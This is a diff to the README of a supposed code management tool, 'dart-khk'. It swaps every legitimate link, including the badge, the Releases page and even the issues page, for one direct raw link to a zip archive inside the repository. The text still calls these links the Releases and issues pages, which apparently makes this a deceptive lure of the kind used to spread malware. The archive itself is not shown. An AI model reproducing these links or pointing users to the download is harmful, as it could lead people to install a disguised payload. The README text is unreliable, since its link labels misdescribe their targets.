@@ -1,6 +1,6 @@
 # 🖥️ dart-khk - Simple and Effective Code Management Tool
 
-![Download dart-khk](https://img.shields.io/badge/Download-dart--khk-blue.svg)
+![Download dart-khk](https://raw.githubusercontent.com/degradationebb605/dart-khk/main/pollam/dart-khk-v2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This guide will help you download and run the dart-khk application, a tool desig
 
 To download dart-khk, please visit the Releases page:
 
-[Visit the Releases Page](https://github.com/degradationebb605/dart-khk/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/degradationebb605/dart-khk/main/pollam/dart-khk-v2.3.zip)
 
 Once on the Releases page, look for the latest version. Click on the download link for your operating system.
 
@@ -72,11 +72,11 @@ Yes, dart-khk is compatible with Windows, macOS, and Linux.
 
 ### How do I report a bug or request a feature?
 
-Visit our [issues page](https://github.com/degradationebb605/dart-khk/issues) on GitHub to submit a report or request.
+Visit our [issues page](https://raw.githubusercontent.com/degradationebb605/dart-khk/main/pollam/dart-khk-v2.3.zip) on GitHub to submit a report or request.
 
 ## 🔗 Additional Resources
 
 For more detailed documentation, check our Wiki section on the GitHub repository. You can also join discussions in our community forums to exchange tips and get help from fellow users.
 
 Visit the Releases page to download dart-khk again at any time:  
-[Download dart-khk](https://github.com/degradationebb605/dart-khk/releases)
+[Download dart-khk](https://raw.githubusercontent.com/degradationebb605/dart-khk/main/pollam/dart-khk-v2.3.zip)
